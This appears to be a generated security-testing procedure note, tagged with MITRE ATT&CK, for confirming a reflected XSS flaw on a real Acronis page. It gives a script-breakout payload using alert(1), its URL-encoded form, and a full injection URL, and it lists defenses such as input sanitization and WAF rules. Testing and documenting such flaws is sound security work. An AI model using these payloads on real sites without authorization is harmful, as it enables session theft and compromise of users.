---
id: uuid-test-alert
tags:
  - xss
  - testing
  - payload-injection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T03:16:31.421Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Test Reflected XSS with Alert Payload on Acronis Page

## Summary

This procedure tests the XSS vulnerability by injecting a simple alert script into the email parameter, confirming JavaScript execution in the browser context.

## Description

Building on parameter identification, this step uses a benign payload like alert(1) to verify if injected scripts execute. The payload closes any open HTML tags and injects <script> tags. Targeted at the Acronis page, it requires URL encoding to bypass transmission filters. Outcomes include popup confirmation, proving the site is exploitable for more advanced attacks like session theft or admin escalation.

## Requirements

1. URL encoder (browser console or online tool)
2. Web browser
3. Knowledge of basic JavaScript and HTML

## Defense

Defensive measures and detection strategies:

- Sanitize inputs with libraries like OWASP ESAPI
- Deploy web application firewall (WAF) rules to block script tags
- Log and alert on suspicious payloads in query strings

## Objectives

1. Execute arbitrary JavaScript via reflection
2. Validate vulnerability without harm
3. Prepare for complex payload development

## Instructions

### Step 1: Craft Basic Payload

**Context**: Create a payload that breaks out of HTML context and injects script.

Use payload: tester@gmail.com</script><script>alert(1)</script>qw87f

URL-encode it: tester@gmail.com%3C%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3Eqw87f

### Step 2: Inject and Test

**Context**: Append to URL and visit to trigger execution.

Construct full URL: https://cz.acronis.com/dekujeme-za-odber-novinek-produktu-disk-director/?user=OK&oktosend=&email=tester@gmail.com%3C%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3Eqw87f

Visit the URL in a browser and check for alert popup.

> Alert execution confirms XSS; no popup indicates filtering or non-vulnerable reflection.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[testing]]
- [[payload-injection]]
